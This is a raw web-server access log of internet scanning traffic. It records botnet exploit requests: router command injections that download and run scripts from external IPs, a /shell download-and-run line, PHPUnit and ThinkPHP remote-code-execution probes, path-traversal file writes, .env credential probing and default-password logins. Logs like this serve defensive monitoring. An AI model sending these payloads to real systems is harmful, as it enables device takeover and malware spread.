INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 Not Found
INFO:     8.213.41.202:0 - "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.0" 200 OK
INFO:     8.213.41.202:0 - "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     103.38.182.146:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     87.246.7.54:0 - "GET / HTTP/1.0" 200 OK
INFO:     88.248.102.172:0 - "GET / HTTP/1.0" 200 OK
INFO:     44.220.188.78:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.156.129.46:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.156.129.46:0 - "GET /aspera/faspex/ HTTP/1.0" 200 OK
INFO:     104.152.52.161:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     95.214.27.253:0 - "GET /cgi-bin/luci/ HTTP/1.0" 200 OK
INFO:     95.214.27.253:0 - "GET /cgi-bin/luci/ HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     95.214.27.253:0 - "GET /cgi-bin/luci/ HTTP/1.0" 200 OK
INFO:     87.13.201.186:0 - "GET / HTTP/1.0" 200 OK
INFO:     145.255.248.64:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     167.94.145.99:0 - "GET / HTTP/1.0" 200 OK
INFO:     167.94.145.99:0 - "GET / HTTP/1.0" 200 OK
INFO:     167.94.145.99:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     103.203.57.7:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.66:0 - "GET /ip HTTP/1.0" 404 Not Found
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     141.98.10.12:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     78.153.140.177:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.150.26.220:0 - "GET / HTTP/1.0" 200 OK
INFO:     172.245.88.144:0 - "GET / HTTP/1.0" 200 OK
INFO:     40.118.208.242:0 - "GET /actuator/health HTTP/1.0" 200 OK
INFO:     207.231.105.76:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     207.231.105.76:0 - "POST / HTTP/1.0" 405 Method Not Allowed
INFO:     141.98.10.12:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     141.98.10.12:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     46.174.191.30:0 - "GET / HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET / HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /css/2.5b37d44a.chunk.css HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /css/main.0b8f9a9b.chunk.css HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /js/main.c3b195bc.chunk.js HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /js/2.c7557a74.chunk.js HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /media/logo_small.4204397d.svg HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /api/v1/workspaces HTTP/1.0" 401 Unauthorized
INFO:     77.238.243.73:0 - "GET /api/v1/users?hydrate=true&size=1000&page=1 HTTP/1.0" 401 Unauthorized
INFO:     77.238.243.73:0 - "GET /api/v1/info HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /media/Rubik-Regular.b3d0902b.ttf HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /media/Rubik-Medium.c87313aa.ttf HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /api/v1/workspaces/default/statistics HTTP/1.0" 401 Unauthorized
INFO:     77.238.243.73:0 - "GET /api/v1/info HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /api/v1/workspaces HTTP/1.0" 401 Unauthorized
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     34.22.208.68:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /login?route=%2Fworkspaces%2Fdefault%3F HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /api/v1/info HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET / HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /api/v1/workspaces HTTP/1.0" 401 Unauthorized
INFO:     77.238.243.73:0 - "GET /api/v1/info HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /api/v1/info HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     119.15.90.78:0 - "GET / HTTP/1.0" 200 OK
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     162.216.150.70:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.242.226.99:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     185.242.226.99:0 - "GET /favicon.png HTTP/1.0" 404 Not Found
INFO:     185.242.226.99:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     167.99.61.253:0 - "GET / HTTP/1.0" 200 OK
INFO:     205.210.31.224:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.156.129.85:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.174.191.28:0 - "GET / HTTP/1.0" 200 OK
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     185.230.143.39:0 - "POST /boaform/admin/formLogin HTTP/1.0" 405 Method Not Allowed
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     174.138.29.28:0 - "GET /manager/html HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     64.62.156.96:0 - "GET / HTTP/1.0" 200 OK
INFO:     64.62.156.97:0 - "GET /webui/ HTTP/1.0" 200 OK
INFO:     64.62.156.99:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     64.62.156.101:0 - "GET /geoserver/web/ HTTP/1.0" 200 OK
INFO:     34.76.158.233:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     83.97.73.245:0 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     83.97.73.245:0 - "GET /actuator/gateway/routes HTTP/1.0" 200 OK
INFO:     13.91.166.53:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     194.55.186.238:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     45.128.199.92:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     45.8.17.43:0 - "POST / HTTP/1.0" 405 Method Not Allowed
INFO:     45.128.199.106:0 - "GET /sendgrid/.env HTTP/1.0" 200 OK
INFO:     45.128.199.94:0 - "POST / HTTP/1.0" 405 Method Not Allowed
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     197.56.67.62:0 - "GET /shell?cd+/tmp;rm+-rf+*;wget+89.110.76.210/jaws;sh+/tmp/jaws HTTP/1.0" 200 OK
INFO:     78.153.140.179:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     192.227.190.158:0 - "GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobwktZQlcXHg2NVxceDYzXFx4NjhcXHg2ZlxceDIwXFx4MjdcXHg3OFxceDc4XFx4NzhcXHg3OFxceDc4XFx4NjNcXHg2M1xceDYzXFx4NjNcXHg2M1xceDI3fHNo HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.142.182.78:0 - "GET / HTTP/1.0" 200 OK
INFO:     157.254.164.21:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     141.98.10.12:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     193.47.54.77:0 - "GET / HTTP/1.0" 200 OK
INFO:     5.8.11.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     152.32.206.74:0 - "GET / HTTP/1.0" 200 OK
INFO:     80.82.77.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.132.194.20:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     45.132.194.20:0 - "GET /image/lgbg.jpg HTTP/1.0" 200 OK
INFO:     45.132.194.20:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.132.194.20:0 - "GET /login.rsp HTTP/1.0" 404 Not Found
INFO:     45.132.194.20:0 - "GET /webgui/ HTTP/1.0" 200 OK
INFO:     45.132.194.20:0 - "GET /login HTTP/1.0" 404 Not Found
INFO:     45.132.194.20:0 - "GET /owa/auth/logon.aspx HTTP/1.0" 200 OK
INFO:     45.132.194.20:0 - "GET /resources/favicon.ico HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.150.26.220:0 - "GET / HTTP/1.0" 200 OK
INFO:     79.241.53.207:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     103.56.61.144:0 - "GET / HTTP/1.0" 200 OK
INFO:     103.56.61.144:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     103.56.61.144:0 - "GET /robots.txt HTTP/1.0" 200 OK
INFO:     103.56.61.144:0 - "GET /.well-known/security.txt HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /login?route=%2Fworkspaces%2Fdefault%3F HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /css/2.5b37d44a.chunk.css HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /css/main.0b8f9a9b.chunk.css HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /js/2.c7557a74.chunk.js HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /js/main.c3b195bc.chunk.js HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /api/v1/info HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /media/Rubik-Regular.b3d0902b.ttf HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /media/Rubik-Medium.c87313aa.ttf HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     103.56.61.144:0 - "GET / HTTP/1.0" 200 OK
INFO:     103.56.61.144:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     103.56.61.144:0 - "GET /robots.txt HTTP/1.0" 200 OK
INFO:     103.56.61.144:0 - "GET /.well-known/security.txt HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     93.174.93.12:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.10.12:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     205.210.31.55:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.10.12:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     46.174.191.31:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     75.111.127.36:0 - "GET / HTTP/1.0" 200 OK
INFO:     114.73.40.160:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.10.12:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     162.216.149.33:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     128.14.173.117:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     118.123.105.93:0 - "GET / HTTP/1.0" 200 OK
INFO:     117.213.184.151:0 - "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
